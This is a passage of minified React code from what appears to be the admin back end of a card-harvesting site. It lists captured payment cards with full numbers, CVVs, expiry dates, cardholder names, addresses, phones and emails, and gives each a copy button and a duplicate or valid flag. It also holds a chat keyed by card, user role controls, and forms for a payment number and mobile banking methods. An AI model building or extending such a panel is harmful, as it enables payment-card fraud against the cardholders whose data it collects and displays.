border-yellow-500",children:[g.jsx("h3",{className:"text-gray-500 text-sm",children:"Duplicate Cards"}),g.jsx("p",{className:"text-2xl font-bold",children:t.filter(I=>I.isDuplicate).length})]}),g.jsxs("div",{className:"bg-white p-4 rounded-lg shadow border-l-4 border-green-500",children:[g.jsx("h3",{className:"text-gray-500 text-sm",children:"Today's Cards"}),g.jsx("p",{className:"text-2xl font-bold",children:t.filter(I=>{const j=new Date(I.timestamp),z=new Date;return j.getFullYear()===z.getFullYear()&&j.getMonth()===z.getMonth()&&j.getDate()===z.getDate()}).length})]})]}),g.jsx("div",{className:"bg-white rounded-lg shadow overflow-hidden",children:g.jsx("div",{className:"overflow-x-auto",children:g.jsxs("table",{className:"min-w-full divide-y divide-gray-200",children:[g.jsx("thead",{className:"bg-gray-50",children:g.jsxs("tr",{children:[g.jsx("th",{className:"px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider",children:"Card Details"}),g.jsx("th",{className:"px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider",children:"Expiration"}),g.jsx("th",{className:"px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider",children:"Security"}),g.jsx("th",{className:"px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider",children:"Status"}),g.jsx("th",{className:"px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider",children:"Date Added"}),g.jsx("th",{className:"px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider",children:"Actions"})]})}),g.jsx("tbody",{className:"bg-white divide-y divide-gray-200",children:Q.length>0?Q.map(I=>{const j=Mf(I.cardNumber);return g.jsxs("tr",{className:"hover:bg-gray-50",children:[g.jsx("td",{className:"px-6 py-4 whitespace-nowrap",children:g.jsxs("div",{className:"flex items-center",children:[g.jsx("div",{className:"flex-shrink-0 h-10 w-10 bg-blue-100 rounded-full flex items-center justify-center",children:g.jsx(A5,{className:"text-blue-600"})}),g.jsxs("div",{className:"ml-4",children:[g.jsxs("div",{className:"text-sm font-medium text-gray-900 flex items-center",children:[I.cardNumber,j&&g.jsx(WE,{type:j}),g.jsx("button",{onClick:()=>G(I.cardNumber),className:"ml-2 text-gray-400 hover:text-blue-500",children:g.jsx(Df,{size:14})})]}),g.jsx("div",{className:"text-xs text-gray-500 mt-1",children:I.cardHolderName||"No name provided"})]})]})}),g.jsx("td",{className:"px-6 py-4 whitespace-nowrap",children:g.jsxs("div",{className:"flex items-center",children:[g.jsx(xx,{className:"text-gray-400 mr-2"}),g.jsxs("span",{className:"text-sm font-medium text-gray-900",children:[I.expMonth,"/",I.expYear]})]})}),g.jsx("td",{className:"px-6 py-4 whitespace-nowrap",children:g.jsxs("div",{className:"flex items-center",children:[g.jsx(TT,{className:"text-gray-400 mr-2"}),g.jsxs("span",{className:"text-sm font-medium text-gray-900",children:["CVV: ",I.cvv,g.jsx("button",{onClick:()=>G(I.cvv),className:"ml-2 text-gray-400 hover:text-blue-500",children:g.jsx(Df,{size:14})})]})]})}),g.jsx("td",{className:"px-6 py-4 whitespace-nowrap",children:g.jsx("span",{className:`px-3 py-1 inline-flex text-xs leading-5 font-semibold rounded-full 
                                                    ${I.isDuplicate?"bg-yellow-100 text-yellow-800":"bg-green-100 text-green-800"}`,children:I.isDuplicate?"Duplicate":"Valid"})}),g.jsxs("td",{className:"px-6 py-4 whitespace-nowrap",children:[g.jsx("div",{className:"text-sm text-gray-900",children:new Date(I.timestamp).toLocaleDateString()}),g.jsx("div",{className:"text-xs text-gray-500",children:new Date(I.timestamp).toLocaleTimeString()})]}),g.jsxs("td",{className:"px-6 py-4 whitespace-nowrap text-sm font-medium",children:[g.jsx("button",{onClick:()=>L(I),className:"text-blue-600 hover:text-blue-900 mr-3",children:"Details"}),g.jsx("button",{onClick:()=>k(I.id),className:"text-red-600 hover:text-red-900 flex items-center",disabled:w===I.id,children:w===I.id?"Deleting...":g.jsxs(g.Fragment,{children:[g.jsx(Ex,{className:"mr-1"}),"Delete"]})})]})]},I.id)}):g.jsx("tr",{children:g.jsx("td",{colSpan:"6",className:"px-6 py-4 text-center text-gray-500",children:"No cards found matching your search criteria"})})})]})})}),f&&c&&g.jsx("div",{className:"fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50",children:g.jsx("div",{className:"bg-white rounded-lg shadow-xl max-w-2xl w-full max-h-[90vh] overflow-y-auto",children:g.jsxs("div",{className:"p-6",children:[g.jsxs("div",{className:"flex justify-between items-start",children:[g.jsx("h3",{className:"text-lg font-bold text-gray-800",children:"Card Details"}),g.jsx("button",{onClick:N,className:"text-gray-400 hover:text-gray-500",children:""})]}),g.jsxs("div",{className:"mt-6 space-y-4",children:[c.paymentImage&&g.jsxs("div",{children:[g.jsx("label",{className:"block text-sm font-medium text-gray-500 mb-2",children:"Payment Screenshot"}),g.jsxs("div",{className:"border border-gray-200 rounded-lg p-2",children:[g.jsx("img",{src:c.paymentImage,alt:"Payment Screenshot",className:"max-w-full h-auto rounded",onError:I=>{I.target.onerror=null,I.target.src="https://via.placeholder.com/300x200?text=Image+Not+Available"}}),g.jsx("div",{className:"mt-2 flex justify-end",children:g.jsxs("a",{href:c.paymentImage,target:"_blank",rel:"noopener noreferrer",className:"text-blue-600 hover:text-blue-800 text-sm flex items-center",children:[g.jsx(N5,{className:"mr-1"}),"View Full Image"]})})]})]}),g.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[g.jsxs("div",{children:[g.jsx("label",{className:"block text-sm font-medium text-gray-500",children:"Card Number"}),g.jsxs("div",{className:"mt-1 flex items-center",children:[g.jsx("p",{className:"text-sm font-medium text-gray-900",children:c.cardNumber}),Mf(c.cardNumber)&&g.jsx(WE,{type:Mf(c.cardNumber)}),g.jsx("button",{onClick:()=>G(c.cardNumber),className:"ml-2 text-gray-400 hover:text-blue-500",children:g.jsx(Df,{size:14})})]})]}),g.jsxs("div",{children:[g.jsx("label",{className:"block text-sm font-medium text-gray-500",children:"Card Type"}),g.jsx("p",{className:"mt-1 text-sm font-medium text-gray-900 capitalize",children:Mf(c.cardNumber)||"Unknown"})]})]}),g.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[g.jsxs("div",{children:[g.jsx("label",{className:"block text-sm font-medium text-gray-500",children:"Expiration"}),g.jsxs("p",{className:"mt-1 text-sm font-medium text-gray-900",children:[c.expMonth,"/",c.expYear]})]}),g.jsxs("div",{children:[g.jsx("label",{className:"block text-sm font-medium text-gray-500",children:"CVV"}),g.jsxs("p",{className:"mt-1 text-sm font-medium text-gray-900 flex items-center",children:[c.cvv,g.jsx("button",{onClick:()=>G(c.cvv),className:"ml-2 text-gray-400 hover:text-blue-500",children:g.jsx(Df,{size:14})})]})]})]}),g.jsxs("div",{className:"grid grid-cols-2 gap-4",children:[g.jsxs("div",{children:[g.jsx("label",{className:"block text-sm font-medium text-gray-500",children:"Status"}),g.jsx("p",{className:"mt-1",children:g.jsx("span",{className:`px-3 py-1 inline-flex text-xs leading-5 font-semibold rounded-full 
                                                ${c.isDuplicate?"bg-yellow-100 text-yellow-800":"bg-green-100 text-green-800"}`,children:c.isDuplicate?"Duplicate":"Valid"})})]}),g.jsxs("div",{children:[g.jsx("label",{className:"block text-sm font-medium text-gray-500",children:"Added On"}),g.jsx("p",{className:"mt-1 text-sm text-gray-900",children:new Date(c.timestamp).toLocaleString()})]})]}),g.jsx("div",{className:"grid grid-cols-2 gap-4",children:g.jsxs("div",{children:[g.jsx("label",{className:"block text-sm font-medium text-gray-500",children:"Card ID"}),g.jsx("p",{className:"mt-1 text-sm text-gray-900",children:c.id})]})}),c.cardHolderName&&g.jsxs("div",{children:[g.jsx("label",{className:"block text-sm font-medium text-gray-500",children:"Cardholder Name"}),g.jsx("p",{className:"mt-1 text-sm text-gray-900",children:c.cardHolderName})]}),c.billingAddress&&g.jsxs("div",{children:[g.jsx("label",{className:"block text-sm font-medium text-gray-500",children:"Billing Address"}),g.jsx("p",{className:"mt-1 text-sm text-gray-900",children:c.billingAddress})]}),c.phoneNumber&&g.jsxs("div",{children:[g.jsx("label",{className:"block text-sm font-medium text-gray-500",children:"Phone Number"}),g.jsx("p",{className:"mt-1 text-sm text-gray-900",children:c.phoneNumber})]}),c.email&&g.jsxs("div",{children:[g.jsx("label",{className:"block text-sm font-medium text-gray-500",children:"Email"}),g.jsx("p",{className:"mt-1 text-sm text-gray-900",children:c.email})]}),c.notes&&g.jsxs("div",{children:[g.jsx("label",{className:"block text-sm font-medium text-gray-500",children:"Notes"}),g.jsx("p",{className:"mt-1 text-sm text-gray-900",children:c.notes})]}),g.jsxs("div",{className:"pt-4 border-t border-gray-200 flex justify-between",children:[g.jsx("button",{onClick:()=>{k(c.id),N()},className:"px-4 py-2 bg-red-600 text-white rounded-md hover:bg-red-700 flex items-center",disabled:w===c.id,children:w===c.id?"Deleting...":g.jsxs(g.Fragment,{children:[g.jsx(Ex,{className:"mr-2"}),"Delete Card"]})}),g.jsx("button",{onClick:N,className:"px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700",children:"Close"})]})]})]})})})]})},Hz=()=>{const[t,e]=O.useState({}),[n,i]=O.useState({}),[s,o]=O.useState({}),[c,d]=O.useState({}),f=O.useRef({}),p=O.useRef({}),[v]=n5(),b=v.get("scrollTo"),w=O.useRef({});O.useEffect(()=>{const D=cc(uc,"chats");hR(D,Q=>{const G=Q.val();if(console.log(" Chats snapshot data:",G),e(G||{}),G){const L={},N={};Object.keys(G).forEach(T=>{L[T]=b===T||w.current[T]||!1,N[T]=!1,f.current[T]||(f.current[T]=null),p.current[T]||(p.current[T]=null)}),w.current=L,o({...L}),d(N)}})},[b]),O.useEffect(()=>(Object.keys(p.current).forEach(D=>{const Q=p.current[D];Q&&Q.addEventListener("scroll",()=>C(D))}),()=>{Object.keys(p.current).forEach(D=>{const Q=p.current[D];Q&&Q.removeEventListener("scroll",()=>C(D))})}),[t]),O.useEffect(()=>{b&&s[b]&&setTimeout(()=>{M(b),E(b)},300)},[b,s]);const E=D=>{const Q=t[D];if(Q){const G={};Object.keys(Q).forEach(L=>{Q[L].sender!=="admin"&&!Q[L].read&&(G[`chats/${D}/${L}/read`]=!0)}),Object.keys(G).length>0&&LB(cc(uc),G)}};O.useEffect(()=>{Object.keys(t).forEach(D=>{s[D]&&(E(D),setTimeout(()=>M(D),100))})},[t,s]);const C=D=>{const Q=p.current[D];if(Q){const{scrollTop:G,scrollHeight:L,clientHeight:N}=Q,T=L-(G+N)>100;d(k=>({...k,[D]:T}))}},M=D=>{const Q=p.current[D];Q&&Q.scrollTo({top:Q.scrollHeight,behavior:"smooth"})},V=(D,Q)=>{i(G=>({...G,[D]:Q}))},B=D=>{const Q=n[D];if(Q!=null&&Q.trim()){const G={sender:"admin",text:Q,timestamp:Date.now()};uR(cc(uc,`chats/${D}`),G),i(L=>({...L,[D]:""})),setTimeout(()=>M(D),100)}},Y=D=>{o(Q=>{const G={...Q,[D]:!Q[D]};return w.current=G,G}),w.current[D]||(E(D),setTimeout(()=>M(D),100))};return g.jsxs("div",{className:"p-4 max-w-6xl mx-auto",children:[g.jsx("h2",{className:"text-2xl font-bold mb-6 text-gray-800",children:"Admin Chat Panel"}),Object.entries(t).length===0?g.jsx("div",{className:"text-center py-10 text-gray-500",children:"No active chats available"}):g.jsx("div",{className:"space-y-4",children:Object.entries(t).map(([D,Q])=>g.jsxs("div",{className:"border rounded-lg shadow-sm bg-white overflow-hidden",children:[g.jsxs("div",{className:"flex justify-between items-center p-4 bg-gray-50 cursor-pointer",onClick:()=>Y(D),children:[g.jsxs("h3",{className:"font-semibold text-gray-700",children:["Chat with card: ",g.jsx("span",{className:"text-blue-600",children:D}),Object.values(Q).some(G=>G.sender!=="admin"&&!G.read)&&g.jsx("span",{className:"ml-2 bg-red-500 text-white text-xs font-bold px-2 py-0.5 rounded-full",children:"New"})]}),g.jsx("svg",{className:`w-5 h-5 text-gray-500 transition-transform ${s[D]?"rotate-180":""}`,fill:"none",viewBox:"0 0 24 24",stroke:"currentColor",children:g.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M19 9l-7 7-7-7"})})]}),s[D]&&g.jsxs("div",{className:"p-4 relative",children:[g.jsxs("div",{className:"space-y-3 max-h-96 overflow-y-auto mb-4 pr-2",ref:G=>p.current[D]=G,children:[Object.values(Q).map((G,L)=>g.jsx("div",{className:`flex ${G.sender==="admin"?"justify-end":"justify-start"}`,children:g.jsxs("div",{className:`max-w-xs md:max-w-md lg:max-w-lg rounded-lg px-4 py-2 ${G.sender==="admin"?"bg-blue-500 text-white rounded-br-none":"bg-gray-200 text-gray-800 rounded-bl-none"}`,children:[g.jsx("p",{className:"text-sm",children:G.text}),g.jsxs("p",{className:"text-xs mt-1 opacity-70",children:[new Date(G.timestamp).toLocaleTimeString(),G.sender!=="admin"&&G.read&&g.jsx("span",{className:"ml-2 text-green-500",children:" Read"})]})]})},L)),g.jsx("div",{ref:G=>f.current[D]=G})]}),c[D]&&g.jsx("button",{onClick:()=>M(D),className:"absolute right-6 bottom-20 bg-blue-500 text-white p-2 rounded-full shadow-md hover:bg-blue-600 transition-colors",title:"Scroll to bottom",children:g.jsx("svg",{className:"w-5 h-5",fill:"none",viewBox:"0 0 24 24",stroke:"currentColor",children:g.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M19 14l-7 7m0 0l-7-7m7 7V3"})})}),g.jsxs("div",{className:"flex gap-2 mt-4",children:[g.jsx("input",{type:"text",className:"flex-1 border border-gray-300 px-4 py-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm",value:n[D]||"",onChange:G=>V(D,G.target.value),placeholder:"Type your reply...",onKeyPress:G=>G.key==="Enter"&&B(D)}),g.jsx("button",{onClick:()=>B(D),className:"bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 transition-colors text-sm font-medium",children:"Send"})]})]})]},D))})]})},qz=()=>{const[t,e]=O.useState([]),[n,i]=O.useState(!0),[s,o]=O.useState(""),[c,d]=O.useState(1),[f,p]=O.useState([]),v=10;O.useEffect(()=>{(async()=>{try{const Q=wc(Rn,"users"),L=(await L_(Q)).docs.map(N=>({id:N.id,...N.data()}));e(L),i(!1)}catch(Q){console.error("Error fetching users: ",Q),i(!1)}})()},[]);const b=async(D,Q,G)=>{try{await Oj(wc(Rn,"admin_requests"),{userId:D,email:Q,action:G,status:"pending",createdAt:jj(),processed:!1})}catch(L){console.error("Error creating admin request: ",L)}},w=async(D,Q,G)=>{try{p(N=>[...N,D]);const L=Q==="admin"?"user":"admin";await b(D,G,L==="admin"?"promote":"demote"),e(t.map(N=>N.id===D?{...N,role:L}:N)),p(N=>N.filter(T=>T!==D)),Ln.fire({title:"Request Submitted!",text:`Admin request to ${L==="admin"?"promote":"demote"} has been sent`,icon:"success",confirmButtonText:"OK",timer:2e3})}catch(L){console.error("Error updating role: ",L),p(N=>N.filter(T=>T!==D)),Ln.fire({title:"Error!",text:"Failed to submit admin request",icon:"error",confirmButtonText:"OK"})}},E=(D,Q,G)=>{const L=Q==="admin"?"demote":"promote";Ln.fire({title:"Are you sure?",text:`You are about to ${L} this user`,icon:"warning",showCancelButton:!0,confirmButtonColor:"#3085d6",cancelButtonColor:"#d33",confirmButtonText:`Yes, ${L}`}).then(N=>{N.isConfirmed&&w(D,Q,G)})},C=t.filter(D=>D.email.toLowerCase().includes(s.toLowerCase())||D.role.toLowerCase().includes(s.toLowerCase())),M=c*v,V=M-v,B=C.slice(V,M),Y=Math.ceil(C.length/v);return n?g.jsx("div",{className:"flex justify-center items-center h-64",children:g.jsx("div",{className:"animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500"})}):g.jsxs("div",{className:"container mx-auto px-2 sm:px-4 py-4 sm:py-8",children:[g.jsx("h1",{className:"text-xl sm:text-2xl font-bold text-gray-800 mb-4 sm:mb-6",children:"User Role Management"}),g.jsx("div",{className:"mb-4 sm:mb-6",children:g.jsxs("div",{className:"relative",children:[g.jsx("input",{type:"text",placeholder:"Search by email or role...",className:"w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm sm:text-base",value:s,onChange:D=>{o(D.target.value),d(1)}}),g.jsx("svg",{className:"absolute right-3 top-3 h-4 w-4 sm:h-5 sm:w-5 text-gray-400",fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",xmlns:"http://www.w3.org/2000/svg",children:g.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:"2",d:"M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"})})]})}),g.jsxs("div",{className:"bg-white shadow-md rounded-lg overflow-hidden",children:[g.jsx("div",{className:"overflow-x-auto",children:g.jsxs("table",{className:"min-w-full divide-y divide-gray-200",children:[g.jsx("thead",{className:"bg-gray-50",children:g.jsxs("tr",{children:[g.jsx("th",{className:"px-3 sm:px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider",children:"Email"}),g.jsx("th",{className:"hidden sm:table-cell px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider",children:"Created At"}),g.jsx("th",{className:"px-3 sm:px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider",children:"Role"}),g.jsx("th",{className:"px-3 sm:px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider",children:"Actions"})]})}),g.jsx("tbody",{className:"bg-white divide-y divide-gray-200",children:B.length>0?B.map(D=>g.jsxs("tr",{className:"hover:bg-gray-50",children:[g.jsxs("td",{className:"px-3 sm:px-6 py-4 whitespace-nowrap",children:[g.jsx("div",{className:"text-sm font-medium text-gray-900",children:D.email}),g.jsx("div",{className:"sm:hidden text-xs text-gray-500",children:new Date(D.createdAt).toLocaleDateString()})]}),g.jsx("td",{className:"hidden sm:table-cell px-6 py-4 whitespace-nowrap text-sm text-gray-500",children:new Date(D.createdAt).toLocaleString()}),g.jsx("td",{className:"px-3 sm:px-6 py-4 whitespace-nowrap text-sm",children:g.jsx("span",{className:`px-2 inline-flex text-xs leading-5 font-semibold rounded-full 
                                                ${D.role==="admin"?"bg-green-100 text-green-800":"bg-blue-100 text-blue-800"}`,children:D.role})}),g.jsx("td",{className:"px-3 sm:px-6 py-4 whitespace-nowrap text-sm text-gray-500",children:g.jsx("button",{onClick:()=>E(D.id,D.role,D.email),disabled:f.includes(D.id),className:`px-3 py-1 sm:px-4 sm:py-2 rounded-md text-xs sm:text-sm font-medium text-white flex items-center justify-center w-full sm:w-auto
                                                    ${D.role==="admin"?"bg-red-600 hover:bg-red-700":"bg-blue-600 hover:bg-blue-700"}
                                                    ${f.includes(D.id)?"opacity-75 cursor-not-allowed":""}`,children:f.includes(D.id)?g.jsxs(g.Fragment,{children:[g.jsxs("svg",{className:"animate-spin -ml-1 mr-2 h-3 w-3 sm:h-4 sm:w-4 text-white",xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",children:[g.jsx("circle",{className:"opacity-25",cx:"12",cy:"12",r:"10",stroke:"currentColor",strokeWidth:"4"}),g.jsx("path",{className:"opacity-75",fill:"currentColor",d:"M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"})]}),D.role==="admin"?"Demoting...":"Promoting..."]}):D.role==="admin"?"Demote":"Promote"})})]},D.id)):g.jsx("tr",{children:g.jsx("td",{colSpan:"4",className:"px-6 py-4 text-center text-sm text-gray-500",children:"No users found"})})})]})}),C.length>v&&g.jsxs("div",{className:"px-4 sm:px-6 py-3 flex items-center justify-between border-t border-gray-200",children:[g.jsxs("div",{className:"flex-1 flex justify-between sm:hidden",children:[g.jsx("button",{onClick:()=>d(D=>Math.max(D-1,1)),disabled:c===1,className:"relative inline-flex items-center px-3 py-2 border border-gray-300 text-xs font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50",children:"Previous"}),g.jsx("button",{onClick:()=>d(D=>D+1),disabled:c===Y,className:"ml-3 relative inline-flex items-center px-3 py-2 border border-gray-300 text-xs font-medium rounded-md text-gray-700 bg-white hover:bg-gray-50",children:"Next"})]}),g.jsxs("div",{className:"hidden sm:flex-1 sm:flex sm:items-center sm:justify-between",children:[g.jsx("div",{children:g.jsxs("p",{className:"text-sm text-gray-700",children:["Showing ",g.jsx("span",{className:"font-medium",children:V+1})," to"," ",g.jsx("span",{className:"font-medium",children:Math.min(M,C.length)})," ","of ",g.jsx("span",{className:"font-medium",children:C.length})," results"]})}),g.jsx("div",{children:g.jsxs("nav",{className:"relative z-0 inline-flex rounded-md shadow-sm -space-x-px","aria-label":"Pagination",children:[g.jsxs("button",{onClick:()=>d(1),disabled:c===1,className:"relative inline-flex items-center px-2 py-2 rounded-l-md border border-gray-300 bg-white text-sm font-medium text-gray-500 hover:bg-gray-50",children:[g.jsx("span",{className:"sr-only",children:"First"}),""]}),g.jsxs("button",{onClick:()=>d(D=>Math.max(D-1,1)),disabled:c===1,className:"relative inline-flex items-center px-2 py-2 border border-gray-300 bg-white text-sm font-medium text-gray-500 hover:bg-gray-50",children:[g.jsx("span",{className:"sr-only",children:"Previous"}),""]}),Array.from({length:Math.min(5,Y)},(D,Q)=>{let G;return Y<=5||c<=3?G=Q+1:c>=Y-2?G=Y-4+Q:G=c-2+Q,g.jsx("button",{onClick:()=>d(G),className:`relative inline-flex items-center px-3 sm:px-4 py-2 border text-xs sm:text-sm font-medium 
                                                    ${c===G?"z-10 bg-blue-50 border-blue-500 text-blue-600":"bg-white border-gray-300 text-gray-500 hover:bg-gray-50"}`,children:G},G)}),g.jsxs("button",{onClick:()=>d(D=>Math.min(D+1,Y)),disabled:c===Y,className:"relative inline-flex items-center px-2 py-2 border border-gray-300 bg-white text-sm font-medium text-gray-500 hover:bg-gray-50",children:[g.jsx("span",{className:"sr-only",children:"Next"}),""]}),g.jsxs("button",{onClick:()=>d(Y),disabled:c===Y,className:"relative inline-flex items-center px-2 py-2 rounded-r-md border border-gray-300 bg-white text-sm font-medium text-gray-500 hover:bg-gray-50",children:[g.jsx("span",{className:"sr-only",children:"Last"}),""]})]})})]})]})]})]})},Gz=({children:t})=>{const[e,n]=O.useState({loading:!0,isAdmin:!1,currentUser:null}),i=bi();return O.useEffect(()=>{const s=Kf.onAuthStateChanged(async o=>{if(o)try{const c=await zs(gi(Rn,"users",o.email)),d=c.exists()&&c.data().role==="admin";n({loading:!1,isAdmin:d,currentUser:o})}catch(c){console.error("Error checking admin status:",c),n({loading:!1,isAdmin:!1,currentUser:o})}else n({loading:!1,isAdmin:!1,currentUser:null})});return()=>s()},[]),e.loading?g.jsx("div",{className:"min-h-screen flex items-center justify-center",children:g.jsx("div",{className:"animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500"})}):e.currentUser?e.isAdmin?t:g.jsx(A0,{to:"/access-denied",replace:!0}):g.jsx(A0,{to:"/admin-login",state:{from:i},replace:!0})},Yz=()=>{const[t,e]=O.useState(""),[n,i]=O.useState(""),[s,o]=O.useState(!0),[c,d]=O.useState(!1);O.useEffect(()=>{(async()=>{try{const v=gi(Rn,"payment-info","payment-number"),b=gi(Rn,"payment-info","tag-name"),w=await zs(v),E=await zs(b);w.exists()&&e(w.data().numberInfo),E.exists()&&i(E.data().nameInfo),o(!1)}catch(v){console.error("Error fetching data:",v),o(!1),Ln.fire({icon:"error",title:"Error",text:"Failed to load payment information"})}})()},[]);const f=async p=>{p.preventDefault(),d(!0);try{const v=gi(Rn,"payment-info","payment-number"),b=gi(Rn,"payment-info","tag-name");await Cm(v,{numberInfo:t}),await Cm(b,{nameInfo:n}),Ln.fire({icon:"success",title:"Success!",text:"Payment information updated successfully",timer:2e3,showConfirmButton:!1})}catch(v){console.error("Error updating:",v),Ln.fire({icon:"error",title:"Error",text:"Failed to update payment information"})}finally{d(!1)}};return g.jsxs("div",{className:"max-w-md mx-auto mt-10 p-6 border border-gray-300 rounded-lg shadow-md",children:[g.jsx("h2",{className:"text-2xl font-bold mb-4 text-center",children:"Update Payment Info"}),s?g.jsx("div",{className:"flex justify-center items-center py-4",children:g.jsx("div",{className:"animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"})}):g.jsxs("form",{onSubmit:f,className:"space-y-4",children:[g.jsxs("div",{children:[g.jsx("label",{className:"block font-semibold mb-1",children:"Payment Number"}),g.jsx("input",{type:"text",value:t,onChange:p=>e(p.target.value),className:"w-full px-4 py-2 border rounded-md focus:outline-none focus:ring focus:border-blue-300",required:!0})]}),g.jsxs("div",{children:[g.jsx("label",{className:"block font-semibold mb-1",children:"Tag Name"}),g.jsx("input",{type:"text",value:n,onChange:p=>i(p.target.value),className:"w-full px-4 py-2 border rounded-md focus:outline-none focus:ring focus:border-blue-300",required:!0})]}),g.jsx("button",{type:"submit",disabled:c,className:`w-full flex justify-center items-center py-2 rounded-md transition ${c?"bg-blue-400":"bg-blue-600 hover:bg-blue-700"} text-white`,children:c?g.jsxs(g.Fragment,{children:[g.jsxs("svg",{className:"animate-spin -ml-1 mr-2 h-4 w-4 text-white",xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",children:[g.jsx("circle",{className:"opacity-25",cx:"12",cy:"12",r:"10",stroke:"currentColor",strokeWidth:"4"}),g.jsx("path",{className:"opacity-75",fill:"currentColor",d:"M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"})]}),"Updating..."]}):"Update Info"})]})]})},Qz=()=>{const[t,e]=O.useState([]),[n,i]=O.useState(null),[s,o]=O.useState(""),[c,d]=O.useState(""),[f,p]=O.useState(!0),[v,b]=O.useState(!1),[w,E]=O.useState(!1),[C,M]=O.useState(!1),V=gi(Rn,"mobile-banking","ahJvZ2I0MYKwwH9rl0fU");O.useEffect(()=>{(async()=>{try{const N=await zs(V);if(N.exists()){const T=N.data();e(T.method||[])}}catch(N){console.error("Error fetching methods:",N),Ln.fire({icon:"error",title:"Error",text:"Failed to load data!"})}finally{p(!1)}})()},[]);const B=async L=>{b(!0);try{await Cm(V,{method:L}),e(L),Ln.fire({icon:"success",title:"Success!",text:"Updated successfully!",timer:2e3,showConfirmButton:!1})}catch(N){console.error("Update failed:",N),Ln.fire({icon:"error",title:"Error",text:"Update failed!"})}finally{b(!1)}},Y=L=>{i(L),o(t[L])},D=async()=>{const L=s.trim();if(L){M(!0);try{const N=[...t];N[n]=L,await B(N),i(null),o("")}finally{M(!1)}}},Q=async L=>{if((await Ln.fire({title:"Are you sure?",text:"You won't be able to revert this!",icon:"warning",showCancelButton:!0,confirmButtonColor:"#3085d6",cancelButtonColor:"#d33",confirmButtonText:"Yes, delete it!"})).isConfirmed){const T=t.filter((k,I)=>I!==L);await B(T)}},G=async()=>{const L=c.trim();if(L){if(t.includes(L)){Ln.fire({icon:"error",title:"Error",text:"This method already exists!"});return}E(!0);try{const N=[...t,L];await B(N),d(""),Ln.fire({icon:"success",title:"Added!",text:"New method added successfully!",timer:2e3,showConfirmButton:!1})}finally{E(!1)}}};return g.jsxs("div",{className:"max-w-4xl mx-auto p-4 md:p-6 lg:mt-10 border rounded-lg shadow",children:[g.jsx("h2",{className:"text-xl md:text-2xl font-bold mb-4 text-center",children:"Update Mobile Banking Methods"}),f?g.jsx("div",{className:"flex justify-center items-center py-8",children:g.jsx("div",{className:"animate-spin rounded-full h-10 w-10 border-b-2 border-blue-600"})}):g.jsxs("div",{className:"space-y-4",children:[t.map((L,N)=>g.jsx("div",{className:"flex flex-col sm:flex-row items-start sm:items-center gap-2 p-3 bg-gray-50 rounded-lg",children:n===N?g.jsxs("div",{className:"w-full flex flex-col sm:flex-row gap-2",children:[g.jsx("input",{type:"text",value:s,onChange:T=>o(T.target.value),className:"border px-3 py-2 rounded w-full"}),g.jsxs("div",{className:"flex gap-2",children:[g.jsx("button",{onClick:D,disabled:C,className:"bg-green-600 text-white px-3 py-2 rounded hover:bg-green-700 flex items-center justify-center min-w-[80px] flex-1",children:C?g.jsxs(g.Fragment,{children:[g.jsxs("svg",{className:"animate-spin -ml-1 mr-2 h-4 w-4 text-white",xmlns:"http://www.w3.org/2000/svg",fill:"none",viewBox:"0 0 24 24",children:[g.jsx("circle",{className:"opacity-25",cx:"12",cy:"12",r:"10",stroke:"currentColor",strokeWidth:"4"}),g.jsx("path",{className:"opacity-75",fill:"currentColor",d:"M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"})]}),"Saving"]}):"Save"}),g.jsx("button",{onClick:()=>{i(null),o("")},className:"bg-gray-400 text-white px-3 py-2 rounded hover:bg-gray-500 flex-1",children:"Cancel"})]})]}):g.jsxs(g.Fragment,{children:[g.jsx("span",{className:"flex-grow text-sm sm:text-base break-all",children:L}),g.jsxs("div",{className:"flex gap-2 w-full sm:w-auto",children:[g.jsx("button",{onClick:()=>Y(N),className:"bg-blue-600 text-white px-3 py-2 rounded hover:bg-blue-700 flex-1 sm:flex-none sm:w-20",children:"Edit"}),g.jsx("button",{onClick:()=>Q(N),className:"bg-red-600 text-white px-3 py-2 rounded hover:bg-red-700 flex-1 sm:flex-none sm:w-20",children:"Delete"})]})]})},N)),g.jsxs("div",{className:"flex flex-col sm:flex-row items-center gap-2 mt-6 p-3 bg-gray-50 rounded-lg",children:[g.jsx("input",{type:"text",placeholder:"Add new method",value:c,onChange:L=>d(L.target.value),className:"border px-3 py-2 rounded 